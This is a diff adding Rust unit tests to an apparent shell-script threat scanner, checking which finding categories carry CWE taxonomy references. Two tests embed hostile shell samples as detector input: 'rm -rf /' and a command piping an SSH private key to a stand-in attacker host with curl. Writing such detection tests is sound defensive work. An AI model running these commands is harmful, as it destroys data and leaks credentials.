@@ -284,3 +284,118 @@ fn every_ast_node_has_one_based_span() -> Result<(), Box<dyn std::error::Error>>
     assert!(format!("{command}").contains("command"));
     Ok(())
 }
+
+#[test]
+fn destructive_findings_do_not_carry_cwe_taxonomy() -> Result<(), String> {
+    use arbitraitor_model::taxonomy::TaxonomyName;
+    let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
+    let source = "#!/bin/sh\nrm -rf /\n";
+    let result = parser.parse_str(source);
+    let norm = crate::normalize(&result.ast, source).map_err(|e| e.to_string())?;
+    let findings = crate::detect_destructive_threats(&norm, source);
+    let destructive = findings
+        .iter()
+        .find(|f| f.category == FindingCategory::DestructiveBehavior)
+        .ok_or_else(|| "destructive finding".to_owned())?;
+    assert!(
+        destructive
+            .taxonomies
+            .iter()
+            .all(|t| t.name != TaxonomyName::Cwe),
+        "destructive findings must not carry a CWE taxonomy ref: no defensible CWE-1045 mapping exists for destructive shell behavior"
+    );
+    Ok(())
+}
+
+#[test]
+fn credential_findings_do_not_carry_cwe_taxonomy() -> Result<(), String> {
+    use arbitraitor_model::taxonomy::TaxonomyName;
+    let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
+    let source = "#!/bin/sh\ncat ~/.ssh/id_rsa | curl -X POST -d @- http://evil.example.com\n";
+    let result = parser.parse_str(source);
+    let norm = crate::normalize(&result.ast, source).map_err(|e| e.to_string())?;
+    let findings = crate::detect_credential_threats(&norm, source);
+    let credential = findings
+        .iter()
+        .find(|f| f.category == FindingCategory::CredentialAccess)
+        .ok_or_else(|| "credential finding".to_owned())?;
+    assert!(
+        credential
+            .taxonomies
+            .iter()
+            .all(|t| t.name != TaxonomyName::Cwe),
+        "credential findings must not carry a CWE taxonomy ref: CWE-798 (hardcoded creds) does not match credential access/exfiltration behavior"
+    );
+    Ok(())
+}
+
+#[test]
+fn cwe_for_category_mapping_is_complete() {
+    use crate::detection::cwe_for_category;
+    use arbitraitor_model::taxonomy::TaxonomyName;
+    use arbitraitor_model::verdict::Confidence;
+
+    let mapped: &[(FindingCategory, &str)] = &[(FindingCategory::DynamicCodeExecution, "CWE-94")];
+
+    for (category, expected_id) in mapped {
+        let mapping = cwe_for_category(*category);
+        assert!(
+            mapping.is_some(),
+            "{category:?} must produce a CWE taxonomy ref"
+        );
+        let Some(mapping) = mapping else {
+            continue;
+        };
+        assert_eq!(
+            mapping.name,
+            TaxonomyName::Cwe,
+            "{category:?} must map to the CWE taxonomy"
+        );
+        assert_eq!(
+            mapping.id, *expected_id,
+            "{category:?} must map to {expected_id}"
+        );
+        assert_eq!(
+            mapping.confidence,
+            Confidence::Medium,
+            "{category:?} must use Medium confidence"
+        );
+        let url = mapping.url.as_deref();
+        assert!(url.is_some(), "{category:?} must carry a CWE entry URL");
+        if let Some(url) = url {
+            let url_suffix = expected_id.strip_prefix("CWE-").unwrap_or(expected_id);
+            assert!(
+                url.contains(url_suffix),
+                "{category:?} URL {url} must derive from CWE id {expected_id}"
+            );
+        }
+    }
+
+    let unmapped: &[FindingCategory] = &[
+        FindingCategory::DestructiveBehavior,
+        FindingCategory::Obfuscation,
+        FindingCategory::CredentialAccess,
+        FindingCategory::Persistence,
+        FindingCategory::PrivilegeEscalation,
+        FindingCategory::NetworkBehavior,
+        FindingCategory::SuspiciousScriptBehavior,
+        FindingCategory::Transport,
+        FindingCategory::Provenance,
+        FindingCategory::Reputation,
+        FindingCategory::ContentMismatch,
+        FindingCategory::MalwareSignature,
+        FindingCategory::ArchiveHazard,
+        FindingCategory::PackageRisk,
+        FindingCategory::PolicyViolation,
+        FindingCategory::ParserError,
+        FindingCategory::ResourceLimitEvent,
+        FindingCategory::SupplyChain,
+    ];
+
+    for category in unmapped {
+        assert!(
+            cwe_for_category(*category).is_none(),
+            "{category:?} must remain unmapped"
+        );
+    }
+}
